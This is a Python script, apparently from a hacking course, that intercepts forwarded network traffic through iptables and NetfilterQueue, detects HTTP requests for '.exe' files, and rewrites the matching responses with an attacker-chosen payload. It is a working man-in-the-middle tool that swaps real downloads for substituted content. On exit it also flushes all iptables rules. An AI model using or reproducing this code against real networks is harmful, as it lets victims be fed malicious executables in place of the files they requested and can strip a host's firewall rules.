#! usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import os


class FileInterceptor:
    def __init__(self, load_src, dport, sport):
        self.dport = dport
        self.sport = sport
        self.ack_list = []
        self.load = load_src
        self.scapy_packet = ""
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
        self.start()

    def start(self):
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, self.process_packet)
        try:
            queue.run()
        except KeyboardInterrupt:
            print("\n\n[+] CTRL + C detected, cleaning up and exiting.\n\n")
            os.system("iptables --flush")

    def process_packet(self, packet):
        self.scapy_packet = scapy.IP(packet.get_payload())
        if self.scapy_packet.haslayer(scapy.Raw):
            if self.scapy_packet[scapy.TCP]:
                if self.scapy_packet[scapy.TCP].dport == self.dport:  # set dport to either 80 or 10000
                    self.http_request()
                elif self.scapy_packet[scapy.TCP].sport == self.sport:  # set sport to either 80 or 10000
                    self.http_response(packet)
            else:
                print("[-] No TCP Layer")
                print(self.scapy_packet.show())
            packet.accept()

    # noinspection PyTypeChecker
    def http_request(self):
        print("\n\n[+] HTTP Request >>\n\n")
        if ".exe" in self.scapy_packet[scapy.Raw].load:
            if "something to avoid a forever loop" not in self.scapy_packet[scapy.Raw].load:
                print("\n\n[+] .exe Request found.\n\n")
                self.ack_list.append(self.scapy_packet[scapy.TCP].ack)
        print(self.scapy_packet.show())

    def http_response(self, packet):
        print("\n\n[+] HTTP Response >>\n\n")
        if self.scapy_packet[scapy.TCP].seq in self.ack_list:
            self.ack_list.remove(self.scapy_packet[scapy.TCP].seq)
            print("\n\n[+] Replacing file\n\n")
            modified_packet = self.set_load(self.scapy_packet)
            packet.set_payload(str(modified_packet))
            print(self.scapy_packet.show())

    def set_load(self, packet):
        packet[scapy.Raw].load = self.load
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].len
        return packet
